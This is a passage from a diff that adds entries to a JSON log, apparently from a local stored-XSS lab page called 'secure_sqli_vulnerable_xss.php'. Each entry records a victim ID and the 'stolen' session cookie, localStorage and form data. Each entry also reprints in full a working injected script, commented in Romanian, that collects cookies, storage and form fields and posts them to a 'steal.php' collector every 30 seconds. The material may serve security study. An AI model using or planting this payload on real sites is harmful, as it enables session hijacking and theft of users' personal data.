'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:23:29.254Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:23:59",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435cf4a7e3",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:23:59.299Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:23:59.299Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:24:16",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435e09dae7",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:24:16.640Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:24:16.640Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:24:47",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_686435ff4a830",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:24:47.299Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:24:47.299Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:25:17",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864361d4977a",
+        "raw_input": "{\"attack_type\":\"complete_theft_same_folder\",\"cookies\":\"PHPSESSID=l1639eqifmh52pp4utm7pejsu6\",\"sessionStorage\":\"{}\",\"localStorage\":\"{\\\"autoSavedSql_test_db\\\":\\\"ALTER TABLE\\\\n    users ADD COLUMN profile_note TEXT AFTER role;\\\",\\\"NavigationWidth\\\":\\\"240\\\",\\\"Console\\\":\\\"{\\\\\\\"StartHistory\\\\\\\":false,\\\\\\\"AlwaysExpand\\\\\\\":false,\\\\\\\"CurrentQuery\\\\\\\":true,\\\\\\\"EnterExecutes\\\\\\\":false,\\\\\\\"DarkTheme\\\\\\\":false,\\\\\\\"Mode\\\\\\\":\\\\\\\"show\\\\\\\",\\\\\\\"Height\\\\\\\":92,\\\\\\\"GroupQueries\\\\\\\":false,\\\\\\\"OrderBy\\\\\\\":\\\\\\\"exec\\\\\\\",\\\\\\\"Order\\\\\\\":\\\\\\\"asc\\\\\\\"}\\\",\\\"favoriteTables\\\":\\\"undefined\\\",\\\"Console\/Mode\\\":\\\"\\\\\\\"show\\\\\\\"\\\"}\",\"url\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"referrer\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"pageTitle\":\"Secure SQL but Vulnerable XSS Form\",\"userAgent\":\"Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36\",\"language\":\"ro-RO\",\"platform\":\"MacIntel\",\"screenResolution\":\"1728x1117\",\"formData\":[{\"formIndex\":0,\"action\":\"http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php\",\"method\":\"post\",\"fields\":{\"profile_note\":\"<script>\\nfunction stealAllData() {\\n    var allData = {\\n        attack_type: 'complete_theft_same_folder',\\n        \\n        \/\/ Date sesiune\\n        cookies: document.cookie,\\n        sessionStorage: JSON.stringify(sessionStorage),\\n        localStorage: JSON.stringify(localStorage),\\n        \\n        \/\/ Date pagină\\n        url: window.location.href,\\n        referrer: document.referrer,\\n        pageTitle: document.title,\\n        \\n        \/\/ Date browser\\n        userAgent: navigator.userAgent,\\n        language: navigator.language,\\n        platform: navigator.platform,\\n        screenResolution: screen.width + 'x' + screen.height,\\n        \\n        \/\/ Date formulare\\n        formData: [],\\n        \\n        timestamp: new Date().toISOString()\\n    };\\n    \\n    \/\/ Extrage date din formulare\\n    document.querySelectorAll('form').forEach(function(form, index) {\\n        var formInfo = {\\n            formIndex: index,\\n            action: form.action,\\n            method: form.method,\\n            fields: {}\\n        };\\n        \\n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\\n            if(input.name && input.value) {\\n                formInfo.fields[input.name] = input.value;\\n            }\\n        });\\n        \\n        allData.formData.push(formInfo);\\n    });\\n    \\n    \/\/ Trimite către steal.php (același folder)\\n    fetch('.\/steal.php', {\\n        method: 'POST',\\n        headers: {\\n            'Content-Type': 'application\/json'\\n        },\\n        body: JSON.stringify(allData),\\n        mode: 'no-cors'\\n    }).then(function() {\\n        console.log('💰 Toate datele furate cu succes!');\\n    }).catch(function(error) {\\n        console.error('❌ Furt eșuat:', error);\\n    });\\n}\\n\\n\/\/ Execută imediat\\nstealAllData();\\n\\n\/\/ Repetă la 30 secunde\\nsetInterval(stealAllData, 30000);\\n\\nconsole.log('🎯 Complete data theft activated!');\\n<\/script>\",\"update_profile\":\"1\"}}],\"timestamp\":\"2025-07-01T19:25:17.296Z\"}",
+        "stolen_data": {
+            "attack_type": "complete_theft_same_folder",
+            "cookies": "PHPSESSID=l1639eqifmh52pp4utm7pejsu6",
+            "sessionStorage": "{}",
+            "localStorage": "{\"autoSavedSql_test_db\":\"ALTER TABLE\\n    users ADD COLUMN profile_note TEXT AFTER role;\",\"NavigationWidth\":\"240\",\"Console\":\"{\\\"StartHistory\\\":false,\\\"AlwaysExpand\\\":false,\\\"CurrentQuery\\\":true,\\\"EnterExecutes\\\":false,\\\"DarkTheme\\\":false,\\\"Mode\\\":\\\"show\\\",\\\"Height\\\":92,\\\"GroupQueries\\\":false,\\\"OrderBy\\\":\\\"exec\\\",\\\"Order\\\":\\\"asc\\\"}\",\"favoriteTables\":\"undefined\",\"Console\/Mode\":\"\\\"show\\\"\"}",
+            "url": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "referrer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+            "pageTitle": "Secure SQL but Vulnerable XSS Form",
+            "userAgent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+            "language": "ro-RO",
+            "platform": "MacIntel",
+            "screenResolution": "1728x1117",
+            "formData": [
+                {
+                    "formIndex": 0,
+                    "action": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+                    "method": "post",
+                    "fields": {
+                        "profile_note": "<script>\nfunction stealAllData() {\n    var allData = {\n        attack_type: 'complete_theft_same_folder',\n        \n        \/\/ Date sesiune\n        cookies: document.cookie,\n        sessionStorage: JSON.stringify(sessionStorage),\n        localStorage: JSON.stringify(localStorage),\n        \n        \/\/ Date pagină\n        url: window.location.href,\n        referrer: document.referrer,\n        pageTitle: document.title,\n        \n        \/\/ Date browser\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        platform: navigator.platform,\n        screenResolution: screen.width + 'x' + screen.height,\n        \n        \/\/ Date formulare\n        formData: [],\n        \n        timestamp: new Date().toISOString()\n    };\n    \n    \/\/ Extrage date din formulare\n    document.querySelectorAll('form').forEach(function(form, index) {\n        var formInfo = {\n            formIndex: index,\n            action: form.action,\n            method: form.method,\n            fields: {}\n        };\n        \n        form.querySelectorAll('input, textarea, select').forEach(function(input) {\n            if(input.name && input.value) {\n                formInfo.fields[input.name] = input.value;\n            }\n        });\n        \n        allData.formData.push(formInfo);\n    });\n    \n    \/\/ Trimite către steal.php (același folder)\n    fetch('.\/steal.php', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application\/json'\n        },\n        body: JSON.stringify(allData),\n        mode: 'no-cors'\n    }).then(function() {\n        console.log('💰 Toate datele furate cu succes!');\n    }).catch(function(error) {\n        console.error('❌ Furt eșuat:', error);\n    });\n}\n\n\/\/ Execută imediat\nstealAllData();\n\n\/\/ Repetă la 30 secunde\nsetInterval(stealAllData, 30000);\n\nconsole.log('🎯 Complete data theft activated!');\n<\/script>",
+                        "update_profile": "1"
+                    }
+                }
+            ],
+            "timestamp": "2025-07-01T19:25:17.296Z"
+        }
+    },
+    {
+        "timestamp": "2025-07-01 21:25:46",
+        "ip": "::1",
+        "user_agent": "Mozilla\/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/137.0.0.0 Safari\/537.36",
+        "referer": "http:\/\/localhost\/secureloginsystem\/secure_sqli_vulnerable_xss.php",
+        "method": "POST",
+        "victim_id": "victim_6864363a9dd52",
